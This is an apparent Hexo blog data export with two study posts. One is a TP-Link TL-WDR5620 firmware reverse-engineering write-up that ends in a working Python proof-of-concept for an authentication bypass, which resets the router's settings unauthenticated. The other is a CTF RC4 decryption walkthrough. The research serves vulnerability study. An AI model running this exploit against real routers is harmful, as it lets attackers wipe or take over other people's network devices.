{"meta":{"title":"YUhehe的博客","subtitle":"","description":"学习笔记","author":"YUhehe","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2024-09-05T08:21:03.280Z","updated":"2024-09-05T08:21:03.276Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"下面写关于自己的内容"},{"title":"所有分类","date":"2024-09-05T08:21:43.127Z","updated":"2024-09-05T08:21:43.123Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2024-09-05T08:23:09.189Z","updated":"2024-09-05T08:23:09.185Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"TL-WDR5620 Gigabit Edition v2.3","slug":"TL-WDR5620-Gigabit-Edition-v2-3","date":"2024-09-04T14:01:45.000Z","updated":"2024-09-06T05:45:10.838Z","comments":true,"path":"2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/","permalink":"http://example.com/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/","excerpt":"","text":"Firmware analysisFirmware download:TL-WDR5620千兆版 V2.0升级软件20200302_2.6.60-Tp-link无线路由器及网络设备-恩山无线论坛 (right.com.cn) Advanced decompression and firmware extraction using binwalk 123unzip TL-WDR5620千兆版 V2.0升级软件20200302_2.6.60.zipcd unzip TL-WDR5620千兆版 V2.0升级软件20200302_2.6.60binwalk -Me TL-WDR5620千兆版_V2.0_2.6.60_Build_200302_Rel.57804n.bin It was found that this firmware is based on the VxWorks system (a real-time operating system, RTOS). After decompression and analysis through binwalk, a complete file system similar to that of most other routers cannot be obtained. As can be seen from the binwalk analysis results, the u-Boot program is located at the beginning of the file, followed by LZMA compressed data. To extract the u-Boot program, you need to determine its size or use a specific byte offset, which is 46560. According to this length, use the dd command to extract the uBoot program. 1dd if=TL-WDR5620千兆版_V2.0_2.6.60_Build_200302_Rel.57804n.bin of=uboot.raw bs=1 skip=46560 count=1093216 You can confirm it with binwalk analysis. After extracting the uBoot program, we noticed that the size of the first piece of LZMA data immediately following the u-Boot program is the largest piece of all LZMA data. Generally speaking, this is the location of the main program. We use the same method to extract the main program. . Main program length &#x3D; 1139776 - 62464 &#x3D; 1,077,312 1dd if=TL-WDR5620千兆版_V2.0_2.6.60_Build_200302_Rel.57804n.bin of=main.lzma bs=1 skip=62464 count=1077312 After getting the lzma compressed package file of the main program, decompress it through lzma (the main file is actually the F400 file extracted by the binwalk -Me command. We can also use it directly without extracting it) 1lzma -d main.lzma After decompression, you get the main file. Use binwalk to perform decompression analysis. You can see that it is a VxWorks operating system, little endian. 1binwalk main From the output of binwalk -A main, you can see that there are a large number of MIPSEL instruction sequences in the firmware file main. These are usually machine codes in Little Endian format under the MIPS architecture. MIPSEL is a variant of the MIPS architecture designed for little-endian mode. When using disassembly tools such as ida or ghidra for analysis, you need to know the loading address of the VxWorks system, otherwise the system cannot be analyzed correctly. The loading address of the VxWorks system is the same as the stack initialization address. According to the official instructions given by VxWorks, it uses usrInit for stack initialization, and usrInit is the first function that runs after the VxWorks system boots, so the VxWorks system files can be directly thrown to ida , first use 0 as the loading address, and then find the location where the sp register first appears, which is the loading base address of the VxWorks system. For this firmware, I used the following method: search for the string “MyFirmware” in the firmware, and then search upwards for the beginning of a segment. This is easy to identify. Generally, the beginning of a segment is filled with 0xFF or 0x00 before the previous segment. After finding the starting position of the segment, count 0x18 bytes back. These two four-byte values are the loading address of the VxWorks system. (Note: It is not universal. For detailed methods, see:VxWorks固件加载地址分析方法研究 | Hexo (unrav31.github.io)） But after setting the loading address to 0x80001000, IDA still did not load any functions. However, by pressing the “C” key at some addresses, functions can be automatically analyzed, but there are still very few functions identified. Use the firmware_fix plug-in to identify more functions, and fill in the load base address 0x80001000 (usually filled in, You just need to tick) The effect is as follows But both Imports and Exports are empty. It may be because the symbol table is not imported. However, through binwalk analysis and search for the flag string, it is found that neither the internal nor the external symbol table can be found. It can be judged that this is an unsigned table. firmware I tried using some plug-ins to restore the function name lscan for identificationNot used successfully Use Finger for identification123pip install finger_sdk# Download addresshttps://github.com/aliyunav/Finger/blob/master/finger_plugin.py Put finger_plugin.py into plugins It took me a long time to identify this, but no one was identified. lumina for identification Recognition failed Use Rizzo for identificationI tried several firmwares, but none of them matched. There is no other way but to manually review the code and analyze it. I searched for information on the Internet and found this article: VxWorks固件系统研究 | CTF导航 (ctfiot.com)It seems that the research is also TL-WDR5620, according to this article You can know the following four functions: printf: vprintf: strcapy: strncapy: Then I restored the function name of this main file with reference to the function names of the firmware “TL-WDR7660 2.0.30” and “TL-WDR5620 V3.0_171128 Standard Edition”. First, I based on the error information returned by sending the error packet: “ error_code “ Search for the string “error_code” in the main program files of these three firmwares, compare them one by one, and guess to repair the function name of the main file pair of TL-WDR5620v2.0 After the functions related to “error_code” are fixed, it can be found that there is a vulnerability in the httpProcDataSrv function. The function starts by parsing a JSON object from some data source (perhaps the request body). If parsing fails or the method field is not &quot;do&quot;, the function will jump to label LABEL_70, perform some cleanup operations and exit. If method is &quot;do&quot;, the function next attempts to match the session. If no valid session is found, it will jump to LABEL_18, set the HTTP status code to 401 (unauthorized), and exit. If a valid session exists, the function checks the JSON object for the presence of the “login” field and attempts to obtain the password. If the password verification fails or does not meet the requirements, it will jump to LABEL_26, set the HTTP status code to 401, and exit. The code checks the number of unauthorized attempts and locks the client if the limit is exceeded. If the JSON object contains the field &quot;cfgsync&quot; and the value of the &quot;get_config_info&quot; field is null, the function will call the sub_8030BAFC function, which may bypass the user authorization check. The problem is that if the JSON data we send contains &quot;method&quot;:&quot;do&quot; and &quot;cfgsync&quot;:&#123;&quot;get_config_info&quot;:null&#125;, they may be able to bypass the httpDoAuthorize function (which is supposed to be responsible for user authorization ) call. ExploitProduct: TL-WDR5620 Gigabit version v2.3 The initial login interface requires a password. Run the poc You can see that the wifi name has been reset The password has also been reset poc.py 1234567891011import sysimport requestsif len(sys.argv) != 2: exit()ip = sys.argv[1]s = requests.Session()data = &quot;&#123;\\&quot;system\\&quot;:&#123;\\&quot;reset\\&quot;:null&#125;,\\&quot;method\\&quot;:\\&quot;do\\&quot;, \\&quot;cfgsync\\&quot;:&#123;\\&quot;get_config_info\\&quot;:null&#125;&#125;&quot;response = s.post(&quot;http://%s/ds&quot; %ip, data=data)print(&quot;Status code: %i&quot; % response.status_code)print(&quot;Response body: %s&quot; % response.content) Reference documentation揭秘VxWorks路由器破解之路_哔哩哔哩_bilibili VxWorks固件加载地址分析方法研究 | Hexo (unrav31.github.io) TL-WDR7660 httpProcDataSrv任意代码执行漏洞复现分析_tl-fw防火墙漏洞复现-CSDN博客 二进制静态分析—库函数识别_ida lumina-CSDN博客 VxWorks固件系统研究 | CTF导航 (ctfiot.com) fishykz&#x2F;TP-POC (github.com)","categories":[],"tags":[{"name":"IOT, TL-WDR5620","slug":"IOT-TL-WDR5620","permalink":"http://example.com/tags/IOT-TL-WDR5620/"}]},{"title":"RC4解密","slug":"RC4解密","date":"2024-09-04T02:40:32.000Z","updated":"2024-09-04T12:56:01.551Z","comments":true,"path":"2024/09/04/RC4解密/","permalink":"http://example.com/2024/09/04/RC4%E8%A7%A3%E5%AF%86/","excerpt":"","text":"RC4简介RC4加密算法 - shelmean - 博客园 (cnblogs.com) RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。所谓对称加密，就是加密和解密的过程是一样的。 不说废话了，直接上题 LitCTF-Reverse-ezfc4主程序，输入的Str经过rc4加密后与Buff1&#x3D;0xD5B27CDC90A26E600613E47159B09031B2C71DD77F进行比较，看是否相等。 这直接标出来了rc4初始化函数：rc4_init((__int64)v10, (__int64)key, v4) rc4加密函数：rc4_crypt((__int64)v10, Str, v3) key点进去显示：’fenkey?’，我当时就以为这就是key了，因为也没有看到什么函数对它加密，结果就是解不出来。看了wp才知道这是加密后的key…….，主函数一点都不显示……. 没办法，只能这样看一下了，结果发现还有一个函数 点进去，是把key与自身xor了一下，进行相同的操作，求出原来的key。求出正确的key后就直接进行rc4解密就行。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647key = &quot;fenkey?&quot;key1 = [0x0A, 0x0C, 0x1A, 0x08, 0x11, 0x1F, 0x1E, 0x0]Key = &quot;&quot;for i in range(len(key)): Key += chr(ord(key[i]) ^ key1[i])print(&quot;Key:&quot;, Key)import structdef generate_rc4_key_sbox(key): key_length = len(key) sbox = list(range(256)) j = 0 for i in range(256): j = (j + sbox[i] + key[i % key_length]) % 256 # 确保key[i % key_length]是整数 sbox[i], sbox[j] = sbox[j], sbox[i] return sboxdef rc4(key, ciphertext): # 确保key是字节序列 if isinstance(key, str): key = key.encode() sbox = generate_rc4_key_sbox(key) key_stream = [] i = j = 0 for _ in range(len(ciphertext)): i = (i + 1) % 256 j = (j + sbox[i]) % 256 sbox[i], sbox[j] = sbox[j], sbox[i] k = sbox[(sbox[i] + sbox[j]) % 256] key_stream.append(k) return bytes([c ^ key_stream_idx for c, key_stream_idx in zip(ciphertext, key_stream)])# 假设我们有一个密钥key#Key = b&quot;secret_key&quot; # 这里需要替换为实际的密钥# 密文Buff1ciphertext_hex = &quot;D5B27CDC90A26E600613E47159B09031B2C71DD77F&quot;ciphertext = bytes.fromhex(ciphertext_hex)# 解密plaintext = rc4(Key, ciphertext)print(&quot;解密后的明文:&quot;, plaintext)# Key: litctf!# 解密后的明文: b&#x27;LitCTF&#123;rc4_love_nice&#125;&#x27; 或者直接用RC4解密工具","categories":[],"tags":[{"name":"RC 逆向","slug":"RC-逆向","permalink":"http://example.com/tags/RC-%E9%80%86%E5%90%91/"}]}],"categories":[],"tags":[{"name":"IOT, TL-WDR5620","slug":"IOT-TL-WDR5620","permalink":"http://example.com/tags/IOT-TL-WDR5620/"},{"name":"RC 逆向","slug":"RC-逆向","permalink":"http://example.com/tags/RC-%E9%80%86%E5%90%91/"}]}